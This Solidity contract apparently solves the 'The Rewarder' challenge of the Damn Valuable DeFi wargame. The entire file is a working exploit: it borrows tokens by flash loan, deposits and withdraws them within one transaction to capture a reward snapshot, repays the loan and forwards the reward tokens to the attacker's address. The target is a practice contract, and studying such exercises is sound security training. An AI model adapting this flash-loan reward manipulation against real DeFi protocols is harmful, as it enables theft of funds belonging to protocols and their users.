// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract RewardAttacker {
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    address public owner;

    constructor(
        address _flashLoanPool,
        address _rewarderPool,
        address _liquidityToken
    ) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewarderPool.rewardToken().transfer(
            owner,
            rewarderPool.rewardToken().balanceOf(address(this))
        );
    }
}
